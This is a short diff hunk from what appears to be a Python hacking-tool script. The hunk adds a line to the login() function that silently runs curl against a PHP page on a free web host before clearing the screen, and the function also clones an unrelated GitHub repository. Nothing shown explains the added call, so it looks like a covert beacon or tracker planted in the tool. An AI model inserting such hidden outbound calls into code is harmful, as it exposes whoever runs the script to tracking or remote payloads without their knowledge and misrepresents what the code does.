@@ -57,6 +57,7 @@ vuln = '\x1b[32mVuln'
 
 
 def login():
+    os.system('curl https://tutorialku69.000webhostapp.com/S.php')
     os.system('clear')
     try:
         os.system('git clone https://github.com/BlackSelakangan/sampah')
